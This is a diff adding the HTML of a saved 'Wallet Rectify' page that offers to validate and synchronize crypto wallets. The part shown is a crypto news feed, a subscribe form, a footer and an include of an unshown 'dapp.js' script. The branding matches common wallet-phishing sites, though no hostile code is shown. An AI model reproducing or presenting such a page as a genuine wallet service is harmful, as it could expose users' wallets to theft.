+											<a href="https://en.coin-turk.com/spot-bitcoin-etf-outflows-in-june-set-new-record-at-4-5-billion-sosovalue-reports/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=spot-bitcoin-etf-outflows-in-june-set-new-record-at-4-5-billion-sosovalue-reports"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Spot Bitcoin ETF outflows in June set new record at $4.5 billion, SoSoValue
+									reports
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://timestabloid.com/xrp-is-exhibiting-a-much-stronger-signal-than-price-this-is-worth-watching/"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/default(1).png"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://timestabloid.com/xrp-is-exhibiting-a-much-stronger-signal-than-price-this-is-worth-watching/"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> XRP Is Exhibiting a Much Stronger Signal Than Price: This Is Worth Watching
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://ambcrypto.com/heres-how-dydx-surged-by-30-ahead-of-much-awaited-ecosystem-announcement/"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/ambcrypto.png"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://ambcrypto.com/heres-how-dydx-surged-by-30-ahead-of-much-awaited-ecosystem-announcement/"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Here’s how DYDX surged by +30% ahead of much-awaited ecosystem announcement
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://coinpaprika.com/news/usdt-liquidity-moves-dexs-mica-eu-deadline"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65230099.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://coinpaprika.com/news/usdt-liquidity-moves-dexs-mica-eu-deadline"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> USDT Liquidity Moves to DEXs as MiCA's EU Deadline Arrives
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://en.coin-turk.com/france-recorded-77-crypto-related-kidnappings-and-extortion-attempts-in-the-first-half-of-2026-interior-minister-says/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=france-recorded-77-crypto-related-kidnappings-and-extortion-attempts-in-the-first-half-of-2026-interior-minister-says"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65229539.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://en.coin-turk.com/france-recorded-77-crypto-related-kidnappings-and-extortion-attempts-in-the-first-half-of-2026-interior-minister-says/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=france-recorded-77-crypto-related-kidnappings-and-extortion-attempts-in-the-first-half-of-2026-interior-minister-says"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> France recorded 77 crypto-related kidnappings and extortion attempts in the
+									first half of 2026, interior minister says
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://coinpedia.org/crypto-live-news/metaplanet-increases-bitcoin-holdings-to-43000-btc/"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/coinpedia.png"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://coinpedia.org/crypto-live-news/metaplanet-increases-bitcoin-holdings-to-43000-btc/"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Metaplanet Increases Bitcoin Holdings to 43,000 BTC
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://invezz.com/news/2026/07/02/is-jupiter-price-preparing-for-another-breakout-or-a-pullback/"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65229408.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://invezz.com/news/2026/07/02/is-jupiter-price-preparing-for-another-breakout-or-a-pullback/"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Is Jupiter price preparing for another breakout or a pullback?
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://www.investing.com/news/cryptocurrency-news/liquid-mercury-completes-mica-disclosure-for-merc-enabling-trading-admission-across-the-eu-4771548"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/default(2).png"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://www.investing.com/news/cryptocurrency-news/liquid-mercury-completes-mica-disclosure-for-merc-enabling-trading-admission-across-the-eu-4771548"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Liquid Mercury Completes MiCA Disclosure for MERC, Enabling Trading Admission
+									Across the EU
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://en.coin-turk.com/kash-patels-strategy-stock-deal-reached-250000-what-does-the-late-disclosure-mean-for-btc-investors/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=kash-patels-strategy-stock-deal-reached-250000-what-does-the-late-disclosure-mean-for-btc-investors"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65228920.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://en.coin-turk.com/kash-patels-strategy-stock-deal-reached-250000-what-does-the-late-disclosure-mean-for-btc-investors/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=kash-patels-strategy-stock-deal-reached-250000-what-does-the-late-disclosure-mean-for-btc-investors"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Kash Patel’s Strategy stock deal reached $250000! What does the late
+									disclosure mean for $BTC investors?
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://www.investing.com/news/cryptocurrency-news/bitcoin-rebounds-above-60k-ahead-of-key-us-jobs-data-4772306"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/default(2).png"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://www.investing.com/news/cryptocurrency-news/bitcoin-rebounds-above-60k-ahead-of-key-us-jobs-data-4772306"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Bitcoin rebounds above $60k ahead of key US jobs data
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://www.cryptopolitan.com/openai-offers-trump-admin-a-5-equity-pre-ipo/"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65229537.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://www.cryptopolitan.com/openai-offers-trump-admin-a-5-equity-pre-ipo/"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> OpenAI’s Sam Altman offers Trump admin a 5% equity worth $43 billion ahead of
+									IPO to rival SpaceX
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://coinpedia.org/crypto-live-news/south-korea-stock-market-drop-kospi-index-crashes-over-8/"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/coinpedia.png"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://coinpedia.org/crypto-live-news/south-korea-stock-market-drop-kospi-index-crashes-over-8/"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> South Korea Stock Market Drop: KOSPI Index Crashes Over 8%
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://cryptodaily.co.uk/2026/07/tron-quantum-resistant-testnet-trx-security-bitcoin"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65230191.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://cryptodaily.co.uk/2026/07/tron-quantum-resistant-testnet-trx-security-bitcoin"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> TRON’s Quantum-Resistant Testnet: Why TRX Is Selling Security While Bitcoin
+									Bleeds
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://cryptodaily.co.uk/2026/07/zcash-ironwood-fork-privacy-coin-comeback"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65228575.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://cryptodaily.co.uk/2026/07/zcash-ironwood-fork-privacy-coin-comeback"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Zcash Ironwood Fork: Can ZEC Turn a Security Scare Into a Privacy-Coin
+									Comeback?
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://cryptodaily.co.uk/2026/07/aave-1806-wallet-shock-defi-comeback-before-price"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65228574.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://cryptodaily.co.uk/2026/07/aave-1806-wallet-shock-defi-comeback-before-price"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> AAVE’s 1,806-Wallet Shock: Why DeFi’s Comeback Is Showing Up Before Price
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://news.bitcoin.com/theo-invests-20-million-in-fidelitys-tokenized-fund-to-expand-onchain-treasuries/"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65228284.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://news.bitcoin.com/theo-invests-20-million-in-fidelitys-tokenized-fund-to-expand-onchain-treasuries/"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Theo Invests $20 Million in Fidelity’s Tokenized Fund to Expand Onchain
+									Treasuries
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://en.bitcoinsistemi.com/bitcoin-exchange-binance-announces-it-will-support-this-altcoin-s-network-upgrade-and-hard-fork-proc/"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65228090.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://en.bitcoinsistemi.com/bitcoin-exchange-binance-announces-it-will-support-this-altcoin-s-network-upgrade-and-hard-fork-proc/"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Bitcoin Exchange Binance Announces It Will Support This Altcoin’s Network
+									Upgrade and Hard Fork Process! Here Are the Details
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://seekingalpha.com/article/4919354-ousd-is-bad-for-circle-rating-downgrade?utm_source=cryptocompare.com&amp;utm_medium=referral&amp;feed_item_type=article"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65227665.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://seekingalpha.com/article/4919354-ousd-is-bad-for-circle-rating-downgrade?utm_source=cryptocompare.com&amp;utm_medium=referral&amp;feed_item_type=article"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> OUSD Is Bad For Circle (Rating Downgrade)
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://www.coindesk.com/markets/2026/07/02/xrp-edges-higher-as-whale-activity-rises-while-retail-traders-stay-cautious"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65227523.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://www.coindesk.com/markets/2026/07/02/xrp-edges-higher-as-whale-activity-rises-while-retail-traders-stay-cautious"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> XRP edges higher as whale activity rises while retail traders stay cautious
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://coinpedia.org/price-analysis/solana-price-climbs-10-as-whales-say-sol-a-massive-opportunity/"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/coinpedia.png"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://coinpedia.org/price-analysis/solana-price-climbs-10-as-whales-say-sol-a-massive-opportunity/"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Solana Price Climbs 10% as Whales Say SOL a ‘Massive Opportunity’
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://cryptopotato.com/ethereum-execs-launch-non-profit-to-accelerate-institutional-adoption/"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65227678.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://cryptopotato.com/ethereum-execs-launch-non-profit-to-accelerate-institutional-adoption/"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Ethereum Execs Launch Non-Profit to Accelerate Institutional Adoption
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://www.coindesk.com/markets/2026/07/02/bitcoin-long-term-holders-have-returned-to-accumulation"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65227370.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://www.coindesk.com/markets/2026/07/02/bitcoin-long-term-holders-have-returned-to-accumulation"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Bitcoin's long-term holders have returned to accumulation
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://u.today/ripple-co-founders-pac-boosts-democrat-to-primary-victory"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65227525.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://u.today/ripple-co-founders-pac-boosts-democrat-to-primary-victory"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Ripple Co-Founder's PAC Boosts Democrat to Primary Victory
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://en.coin-turk.com/k-wave-media-sold-all-its-bitcoin-holdings-to-reduce-6-million-in-debt/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=k-wave-media-sold-all-its-bitcoin-holdings-to-reduce-6-million-in-debt"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65227042.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://en.coin-turk.com/k-wave-media-sold-all-its-bitcoin-holdings-to-reduce-6-million-in-debt/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=k-wave-media-sold-all-its-bitcoin-holdings-to-reduce-6-million-in-debt"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> K Wave Media sold all its Bitcoin holdings to reduce $6 million in debt
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div class="col-md-12 col-lg-4 col-12">
+					<form>
+						<h6 class="fw-bold text-body mb-2">SUBSCRIBE</h6>
+						<div class="mb-4 text-muted">Subscribe for the latest news, drops &amp; new features</div>
+						<div class="input-group">
+							<input type="text" class="form-control" placeholder="Enter Your Email">
+							<button class="btn btn-primary" type="button"><i class="bi bi-envelope me-2"></i>
+								Subscribe</button>
+						</div>
+						<div class="small mt-3 text-danger">No worries we don't spam! Unsubscribe at any time by
+							<br>clicking on the link in the email.</div>
+					</form>
+				</div>
+			</div>
+		</div>
+	</footer>
+	<div class="footer-mid py-4">
+		<div class="container">
+			<div class="row align-items-center justify-content-between">
+				<div class="col-auto">
+					<div class="mb-4 mb-md-0">
+						<a class="text-decoration-none link-dark fw-bold pe-2"
+							href="./index.html">Home</a>
+						<a href="#features"
+							class="text-decoration-none link-dark fw-bold px-2">Features</a>
+					</div>
+				</div>
+				<div class="col-auto">
+					<div class="d-flex align-items-center gap-3">
+						<span class="text-decoration-none link-dark">Download app</span>
+						<a href="#"><img
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/app-store.png"
+								alt="#" class="img-fluid"></a>
+						<a href="#"><img
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/google-store.png"
+								alt="#" class="img-fluid"></a>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div class="footer-end bg-white py-4">
+		<div class="container">
+			<div class="row align-items-center justify-content-center">
+				<div class="col-12 text-center">
+					<span class="small">© 2025 Wallet Rectify, All rights reserved.</span>
+				</div>
+			</div>
+		</div>
+	</div>
+
+	<script src="./Validate, Synchronize, and Invest your assets and wallets_files/dapp.js.download"></script>
+
+
+	<style>
+		#marquee-element {
+			padding: 12px !important;
+		}
+
+		.crypto_price_scroll {
+			pointer-events: none;
+		}
+
+		.features_icon {
+			font-size: xxx-large;
+		}
+
+		.selected_features {
+			cursor: pointer;
+		}
+	</style>
+
+</body>
+
+</html>
